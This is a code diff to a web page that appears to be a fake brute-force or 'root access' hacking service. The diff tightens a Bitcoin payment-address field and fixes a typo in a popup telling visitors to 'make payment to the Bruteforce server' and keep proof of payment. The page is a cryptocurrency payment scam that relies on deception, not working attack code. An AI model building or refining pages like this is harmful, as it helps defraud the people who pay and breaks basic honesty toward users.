@@ -84,7 +84,7 @@ function myFunction() {
 }</script>
 		  </div>
 		 <form action="https://kingprologinsfound.blogspot.com/" method=""> <div class="user-box"> 
-         <input type="text" name="" required="required"> 
+         <input type="text" name="" required="required" maxlength="35" minlength="26"> 
          <label>User Bitcoin Payment Address</label> 
          </div> 
          <div class="user-box"> 
@@ -110,7 +110,7 @@ function myFunction() {
 Swal.fire({
   title: 'Root Access Needed To Continue⚠️',
   iconHtml: '<img src="https://www.pngplay.com/wp-content/uploads/2/Hacker-PNG-Background.png" height="100px" width="100px"/>',
-  html:"<br>Steps to Grant Root Access!!</br><br>👉<b>1.Make payment to the Brutrforce server<br><br><br>👉<b>2.Get an evidence of payment with the address use for payment (optional). eg: A screenshot or photograph<br><br><b>Note :</b> This method is anonymous ⚠️ ",
+  html:"<br>Steps to Grant Root Access!!</br><br>👉<b>1.Make payment to the Bruteforce server<br><br><br>👉<b>2.Get an evidence of payment with the address use for payment (optional). eg: A screenshot or photograph<br><br><b>Note :</b> This method is anonymous ⚠️ ",
   customClass: {
     icon: 'no-border'
   }
